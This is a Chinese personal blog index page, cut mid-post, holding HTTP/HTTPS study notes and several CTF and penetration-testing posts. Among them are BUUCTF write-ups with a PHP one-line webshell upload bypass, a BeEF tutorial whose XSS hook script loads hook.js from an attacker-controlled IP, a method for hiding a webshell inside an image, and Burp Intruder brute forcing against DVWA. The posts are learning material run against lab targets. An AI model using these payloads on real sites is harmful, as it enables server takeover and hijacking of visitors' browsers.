<p>2、无状态：服务器不会记录HTTP的状态，减轻了服务器的开销。 但是在完成关联性操作时不方便（如玩4399小游戏，不能换一个游戏就重新登一次账户）</p>
<p>解决办法：使用Cookie技术，通过在请求和响应报文中写入Cookie信息来来控制客户端的状态。</p>
<p>当客户端第一次请求后，服务器会下发一个装有客户信息的Cookie，后续客户端请求服务器时，带上Cookie，服务器就能识别出是谁。<br>3、不安全<br>HTTP传输文本时采用明文传输，不加密，可以直接看见信息。<br>通信时不会验证双方身份，可能访问虚假用户<br>传输过程中的报文可能遭到无疑篡改。<br>3.3 HTTP的状态码<br>写法    类别    解释<br>1xx    Information（信息状态码）    接受的请求正在处理<br>2xx    Success（成功状态码）    请求正常处理完毕<br>3xx    Redirection（重定向状态码）    需要进行附加操作以完成请求<br>4xx    Client Error（客户端错误状态码）    服务器无法处理请求<br>5xx    Server Error（服务端错误状态码）    服务器处理请求出错</p>
<h1 id="4-HTTPS相关问题"><a href="#4-HTTPS相关问题" class="headerlink" title="4. HTTPS相关问题"></a>4. HTTPS相关问题</h1><ol>
<li>HTTPS概念<br>HTTPS协议是身披SSL(Secure Socket Layer)外壳的Http，运行于SSL上，SSL运行于TCP之上，是添加了加密和认证机制的HTTP。</li>
</ol>
<ol start="2">
<li>HTTPS为什么安全？<br>1、混合加密<br>作用：防窃听</li>
</ol>
<p>混合加密：即同时采用公钥和私钥加密，更安全，更高效，更不易被破解。 具体操作方法见问本文章的第一个问题。</p>
<p>HTTPS采用对称加密和非对称加密结合的混合加密方式<br>在通信建立前采用非对称加密的方式交换秘钥，后续就不在使用非对称加密<br>在通信过程中全部使用对称加密的会话秘钥方式，加密明文数据。<br>2. 摘要算法<br>作用：防止数据被篡改。</p>
<p>摘要算法：实现数据完整性，能够为数据生成独一无二的指纹，指纹用于校验数据的完整性，解决了被篡改的风险。</p>
<p>过程<br>1、客户端发送明文前，会通过摘要算法算出明文的指纹，发送时明文和指纹一同加密，发送给服务器。</p>
<p>2、服务器解密后，用相同的摘要算法算出发送过来的明文，通过比较客户端携带的指纹和当前指纹做比较，若相同，则说明数据是完整的。</p>
<ol start="3">
<li>数字证书<br>作用：解决身份认证问题。</li>
</ol>
<p>过程：借助第三方权威机构CA（数字证书认证机构），将服务器公钥放在数字证书（由数字证书认证机构办法）中，只要证书是可信的，公钥就是可信的。</p>
<ol start="3">
<li>采用HTTPS加密的具体流程：<br>假设电脑A要向电脑B发送数据</li>
</ol>
<p>电脑A发送数据前，先通过摘要算法计算出明文的指纹，然后将明文+指纹打包成数据包，并将自己的对称加密的秘钥放入数据报， 同时向电脑B索要公钥。</p>
<p>电脑B将公钥发送过来后，电脑A采用非对称加密的方式，通过电脑B的公钥将自己的数据包加密（非对称加密的原理见之前的解答），加密后，发送给电脑B</p>
<p>电脑B收到电脑A发送过来的数据包后，发现是非对称加密的方式，于是使用自己的私钥解密， 解密后通过计算该数据包的指纹， 与数据包内指纹对比， 若指纹相同，则表示数据没有丢失。</p>
<p>接下来的通信，双方都将使用数据包内的秘钥以对称加密的方式通信。</p>
<h1 id="5-HTTP与HTTPS区别"><a href="#5-HTTP与HTTPS区别" class="headerlink" title="5. HTTP与HTTPS区别"></a>5. HTTP与HTTPS区别</h1><p>端口不同：HTTP与HTTPS使用不同的连接方式，用的端口也不一样，前者是80，后者是443；</p>
<p>资源消耗：和HTTP通信相比，HTTPS通信会由于加减密处理消耗更多的CPU和内存资源；</p>
<p>开销：HTTPS通信需要证书，而证书一般需要向认证机构购买；</p>
<h1 id="6-客户端在使用HTTPS方式与Web服务器通信时的步骤"><a href="#6-客户端在使用HTTPS方式与Web服务器通信时的步骤" class="headerlink" title="6. 客户端在使用HTTPS方式与Web服务器通信时的步骤"></a>6. 客户端在使用HTTPS方式与Web服务器通信时的步骤</h1><p>​ （1）客户使用https的URL访问Web服务器，要求与Web服务器建立SSL连接。</p>
<p>（2）Web服务器收到客户端请求后，会将网站的证书信息（证书中包含公钥）传送一份给客户端。</p>
<p>（3）客户端的浏览器与Web服务器开始协商SSL/TLS连接的安全等级，也就是信息加密的等级。</p>
<p>（4）客户端的浏览器根据双方同意的安全等级，建立会话密钥，然后利用网站的公钥将会话密钥加密，并传送给网站。</p>
<p>（5）Web服务器利用自己的私钥解密出会话密钥。</p>
<p>（6）Web服务器利用会话密钥加密与客户端之间的通信。</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/07/25/buuctf(%E4%BA%8C)/">
                buuctf（二）
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-07-25</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="极客大挑战-2019-Http1"><a href="#极客大挑战-2019-Http1" class="headerlink" title="[极客大挑战 2019]Http1"></a>[极客大挑战 2019]Http1</h1><p><img src="https://img-blog.csdnimg.cn/20210718094853698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>老规矩，查看源代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!-- Two --&gt;</span><br><span class="line">    &lt;section id=&quot;two&quot; class=&quot;wrapper alt style2&quot;&gt;</span><br><span class="line">        &lt;section class=&quot;spotlight&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;image&quot;&gt;&lt;img src=&quot;images/pic01.jpg&quot; alt=&quot;&quot; /&gt;&lt;/div&gt;&lt;div class=&quot;content&quot;&gt;</span><br><span class="line">                &lt;h2&gt;小组简介&lt;/h2&gt;</span><br><span class="line">                &lt;p&gt;·成立时间：2005年3月&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">                ·研究领域：渗透测试、逆向工程、密码学、IoT硬件安全、移动安全、安全编程、二进制漏洞挖掘利用等安全技术&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">                ·小组的愿望：致力于成为国内实力强劲和拥有广泛影响力的安全研究团队，为广大的在校同学营造一个良好的信息安全技术&lt;a style=&quot;border:none;cursor:default;&quot; onclick=&quot;return false&quot; href=&quot;Secret.php&quot;&gt;氛围&lt;/a&gt;！&lt;/p&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/section&gt;</span><br></pre></td></tr></table></figure>
<p>发现有一个隐藏的网页secret.php，点击<br><img src="https://img-blog.csdnimg.cn/20210718095129847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>注：<br>1、HTTP Referer是header的一部分，当浏览器发送请求的时候带上Referer，告诉服务器该网页是从哪个页面链接过来的。<br>2、User Agent，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。</strong><br>紧接着使用burp抓包<br><img src="https://img-blog.csdnimg.cn/20210718132615373.png" alt="在这里插入图片描述"><br>提示浏览器不对，一般访问浏览器的名字都会被设置在UA参数中。如<br><img src="https://img-blog.csdnimg.cn/20210718132702232.png" alt="在这里插入图片描述"><br>将其改成<br><img src="https://img-blog.csdnimg.cn/20210718135843331.png" alt="在这里插入图片描述"><br>还要调整X-Forwarded-For: 127.0.0.1，然后成功拿到flag<br><img src="https://img-blog.csdnimg.cn/20210718140030858.png" alt="在这里插入图片描述"></p>
<h1 id="极客大挑战-2019-Knife1"><a href="#极客大挑战-2019-Knife1" class="headerlink" title="[极客大挑战 2019]Knife1"></a>[极客大挑战 2019]Knife1</h1><p>启动靶机<br><img src="https://img-blog.csdnimg.cn/2021071908211146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开后发现有一个一句话木马，尝试用蚁剑连接一下<br><img src="https://img-blog.csdnimg.cn/20210719083145511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>连接成功，发现flag在文件夹/下</p>
<h1 id="极客大挑战-2019-Upload1"><a href="#极客大挑战-2019-Upload1" class="headerlink" title="[极客大挑战 2019]Upload1"></a>[极客大挑战 2019]Upload1</h1><p>本题为文件上传，先上传一个php文件<br><img src="https://img-blog.csdnimg.cn/af358a9edb044537bb193eb0745e39d6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>意料之内，然后使用burp抓包，修改Content-Type为image/jpeg，然后</p>
<p><img src="https://img-blog.csdnimg.cn/c4390b15e83f445f97379eaa34425f3a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>开来不能php文件被拉入黑名单了，使用不常见的文件后缀名phtml绕过<br><img src="https://img-blog.csdnimg.cn/8afd56235ce340f287d9a9b79a3126eb.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看来&lt;?被过滤掉了，我们换</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[feng])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>上传成功，蚁剑连接<br><img src="https://img-blog.csdnimg.cn/0c597fbded324d1791fabf29d72b6e21.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>本题得解</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/07/25/beef/">
                beef
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-07-25</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <p>@<a href="beef">TOC</a></p>
<h2 id="beef概念"><a href="#beef概念" class="headerlink" title="beef概念"></a>beef概念</h2><p>一、BeEF，全称The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具。 用Ruby语言开发的，Kali中默认安装的一个模块，用于实现对XSS漏洞的攻击和利用。<br>BeEF主要是往网页中插入一段名为hook.js的JS脚本代码，如果浏览器访问了有hook.js(钩子)的页面，就会被hook(勾住)，勾连的浏览器会执行初始代码返回一些信息，接着目标主机会每隔一段时间（默认为1秒）就会向BeEF服务器发送一个请求，询问是否有新的代码需要执行。BeEF服务器本质上就像一个Web应用，被分为前端和后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示， BeEF持有者可以通过浏览器来登录 BeEF 的后端，来控制前端(用户的浏览器)。BeEF一般和XSS漏洞结合使用。</p>
<h2 id="beef的安装"><a href="#beef的安装" class="headerlink" title="beef的安装"></a>beef的安装</h2><p>对于Windows下安装比较费力，所以直接在kali中安装。<br>1、输入命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install beef-xss</span><br></pre></td></tr></table></figure>
<p>即可开始安装<br>2.安装结束后可以查看打开</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo beef-xss</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/5fdfd5ae5824401fa985ee42868737e9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b39b7e90f63c452eb0f4564972d3c0d8.png" alt="在这里插入图片描述"><br>这就是上文提到的hook，是beef中非常重要的东西。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hook:&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="beef的使用"><a href="#beef的使用" class="headerlink" title="beef的使用"></a>beef的使用</h2><p>下面让我们进行一些操作。我们知道beef监听的是端口号为：3000。<br>我们可以打开kali当中的文件系统</p>
<p><img src="https://img-blog.csdnimg.cn/eca4cf655793410e89bb3acdc5b7587c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开config.yaml，在这个里面我们可以修改他所绑定的ip地址成自己的ip<br><img src="https://img-blog.csdnimg.cn/ba6e12f0088c43398dfb1ad9785cc9ae.png" alt="在这里插入图片描述"><br>即host。</p>
<h2 id="beef的实战"><a href="#beef的实战" class="headerlink" title="beef的实战"></a>beef的实战</h2><p>最后让我们进行beef的实战吧！<br><img src="https://img-blog.csdnimg.cn/f7fd8a8d3bc8433eb706f266b01c7df1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在kali下使用phpstudy打开dvwa靶场，选择low级别的<br><img src="https://img-blog.csdnimg.cn/30ba1985e7bd4281ac9e126d1512a197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>因为beef一般针对xss漏洞，所以选择这道题，Name是test，而Message是上面的Hook<br><img src="https://img-blog.csdnimg.cn/3de473d28e0d4f13958648011e218f1d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>会出现这种情况，是因为文本框被限制了，我们只需要右击，然后检查元素<br><img src="https://img-blog.csdnimg.cn/ebf924a1fb89404d9b309ed2c06879ae.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改最大长度，再输入Hook的内容。<br>打开网址<a target="_blank" rel="noopener" href="http://127.0.0.1:3000/ui/panel%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BE%93%E5%85%A5%E5%88%9A%E6%89%8D%E7%9A%84%E5%AF%86%E7%A0%81">http://127.0.0.1:3000/ui/panel，然后输入刚才的密码</a><br><img src="https://img-blog.csdnimg.cn/cb41572a97e0401aa6c5a9e4928b0e0f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>绿色对目标主机生效并且不可见(不会被发现)<br>橙色对目标主机生效但可能可见(可能被发现)<br>灰色对目标主机来必生效(可验证下)<br>红色对目标主机不生效</p>
<p>下面我们进行一个测试<br><img src="https://img-blog.csdnimg.cn/e3037b56194a4b7c806ab787d43be145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击，然后点击Excute，弹窗出现<br><img src="https://img-blog.csdnimg.cn/ae5718d81be94d4ca217d257ce3bbfd3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/07/18/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/">
                图片隐写
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-07-18</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="图片隐写概念"><a href="#图片隐写概念" class="headerlink" title="图片隐写概念"></a>图片隐写概念</h1><p>顾名思义，就是将想要表达的信息隐藏在图片中。</p>
<h1 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h1><p>1、cmd命令<br>2、steghide<br><img src="https://img-blog.csdnimg.cn/20210630195928604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载网址;<a target="_blank" rel="noopener" href="http://steghide.sourceforge.net/download.php">http://steghide.sourceforge.net/download.php</a></p>
<h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><p>1、打开命令提示符，进入到steghide文件夹<br>2、输入\steghide&gt;.\steghide.exe embed -cf 2.jpg -ef 1.txt<br>然后给出一个密码即可。<br>3、提取文字：wrote extracted data to”1.txt”<br>notepad 1.txt即可<img src="https://img-blog.csdnimg.cn/20210630195832140.png" alt="在这里插入图片描述"></p>
<h1 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h1><p>在ctf中我们没有密码，就需要binwalk这个工具。<br><strong>注意：这个工具需要python3环境，对于安装可以参考博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/107741645?utm_source=app&app_version=4.11.0&code=app_1562916241&uLinkId=usr1mkqgl919blen">binwalk</a></strong><br>用法：<br>1、-e 分解出压缩包<br>binwalk -e pcat.bin<br>2、-D或者–dd 分解某种类型的文件（在windows里要用双引号括起来）<br>binwalk -D=jpeg pcat.bin<br>3、-M 递归分解扫描出来的文件（得跟-e或者-D配合使用）<br>binwalk -eM pcat.bin<br>4、-h寻求其他用法<br><img src="https://img-blog.csdnimg.cn/20210716151836386.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/07/18/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC/">
                图片木马的制作
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-07-18</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>图片木马是一张图片中包含了木马（通常是一句话木马）</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>以文件上传漏洞为基本条件，将可执行的条件写入图片中去，再利用文件包含漏洞来执行图片中存在的一句话木马，从而获取目标服务器的权限。</p>
<h2 id="制作方法"><a href="#制作方法" class="headerlink" title="制作方法"></a>制作方法</h2><p>一、copy<br><img src="https://img-blog.csdnimg.cn/20210620165210263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>图片和一句话木马，打开cmd，进入文件夹<br>copy 1.jpg/b+1.php/a 2.jpg<br>其中 /b代表以二进制编码打开文件，/a代表以ASCII码编码打开文件<br><img src="https://img-blog.csdnimg.cn/20210620165726589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>二、利用二进制编码工具<br><img src="https://img-blog.csdnimg.cn/20210620165843266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接在编码的任意位置添加webshell即可，可以配合蚁剑使用。</p>
<h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><p>●文件上传的目录设置为不可执行<br>●判断文件类型<br>●使用随机数改写文件名和文件路径</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/06/20/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/">
                暴力破解
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-06-20</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <p>@<a href="%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3">TOC</a></p>
<h2 id="什么是暴力破解"><a href="#什么是暴力破解" class="headerlink" title="什么是暴力破解"></a>什么是暴力破解</h2><p>一、所谓暴力破解，就是在不知道用户名和密码的情况下，通过工具软件利用字典文件对用户名和密码依次进行尝试。从而最终将用户名或密码破解出来。<br>二、常用的字典文件</p>
<ul>
<li>常用的账号密码，比如top100密码字典、top500用户名字典</li>
<li>互联网上呗拖库后的账号密码，比如当年CSDN泄露的600w用户信息。</li>
<li>使用工具软件按照指定的规则进行排列组合算法生成的字典，比如生日字典等。</li>
</ul>
<h2 id="暴力破解工具——burpsuite"><a href="#暴力破解工具——burpsuite" class="headerlink" title="暴力破解工具——burpsuite"></a>暴力破解工具——burpsuite</h2><p>一、什么是burpsuite:Burp Suite是用于攻击web应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP消息、持久性、认证、代理、日志、警报。<br>二、模块<br>1、Porxy（代理）：代理、处理HTTP请求以及处理HTTP响应。<br><img src="https://img-blog.csdnimg.cn/20210417102319140.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2、Intruder（攻击）：Inturder模块可以将数据包里指定的参数设置成变量（变量也就是要准备攻击的目标），然后再利用字典文件去替换变量里的值，所以常用于自动化猜测或暴力破解过程中。<br><img src="https://img-blog.csdnimg.cn/20210424150339953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="实战举例（DVWA）"><a href="#实战举例（DVWA）" class="headerlink" title="实战举例（DVWA）"></a>实战举例（DVWA）</h2><p><img src="https://img-blog.csdnimg.cn/2021042415094955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>抓包<br><img src="https://img-blog.csdnimg.cn/20210424151103328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>注意：在Burpsuite中，Inturder模块中Position中攻击类型：<br>1、Sriper：狙击手，可以指定多个变量同时破解，但只设置一个字典文件，将指定的变量依次用字典文件内容进行替换。<br>2、Battering ram:攻城锤，可以指定多个变量，但仍只设置一个字典文件，将所有的变量一起用字典内容进行替换。<br>3、Ptichfork:草叉子，可以指定多个变量，但需要为每个变量分别设置一个字典文件，然后用对应的字典内容对变量同时进行替换。<br>4、Cluster bomb:集束炸弹，指定多个变量，并为每个变量分别设置一个字典文件，然后用字典内容组合对变量进行替换。</strong><br>设置攻击的对象            <img src="https://img-blog.csdnimg.cn/20210424152509679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>载荷类型“Payload type”<br><strong>1、Simple list :可以手动添加字典列表，也可以导入Burpsuite目常的子典，百导人自定义的字典。<br>2、Runtime file :只能加载自定义的字典。</strong><br>3、Numbers:设定一个数值范围，从范围内依欠或随机取值进行测试。<br>4、Brute forcer :自己定义字符范围来生成字典文件。<br>Grep-Match：<br>1、设置对与不对的标准，在靶场中如果用户名密码不正确则会提示：Username and/or password incorrect，则设置 Grep-Match为Username and/or password incorrect<br>2、有的页面在用户登录失败时并不出现错误提示，而是仍返回到登录页面，这时就可以从登录页面中提取部分代码作为关键字，比如form action=”#” method=”GET”<br>3、也可通过Length字段进行判断，由于密码正确和密码错误的页面内容肯定不同因而Length字段也会出现区别。<br><img src="https://img-blog.csdnimg.cn/20210424155155562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">
                                                                              </p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/06/19/buuctf/">
                buuctf
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-06-19</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up"></a>warm up</h1><p><img src="https://img-blog.csdnimg.cn/20210615160114434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看源码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo <span class="string">&quot;you can&#x27;t see 